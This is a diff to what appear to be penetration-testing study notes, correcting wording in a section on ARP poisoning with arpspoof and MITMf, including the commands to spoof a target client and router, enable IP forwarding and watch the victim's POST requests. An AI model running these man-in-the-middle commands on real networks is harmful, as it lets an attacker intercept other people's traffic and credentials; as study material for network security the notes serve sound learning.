@@ -81,10 +81,10 @@ After authenticating to a network you gather information about it.
   * `arpsoof -i wlan0 -t <target client IP> <router IP>`
 * Tell the router that I am the target client
   * `arpsoof -i wlan0 -t <router IP> <target client IP>`
-* Enable IP forward to allow packets to flow trough my device without beeing dropped
+* Enable IP forward to allow packets to flow trough my device without being dropped
   * `echo 1 > /proc/sys/net/ipv4/ip_forward`
 ### ARP Poisoning Using MITMf
-* Tell the router that I am the target client
+* Tell the target client that I am router
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0`
 
-This way you can see all the request made by the target client
+This way you can see all the post request made by the target client
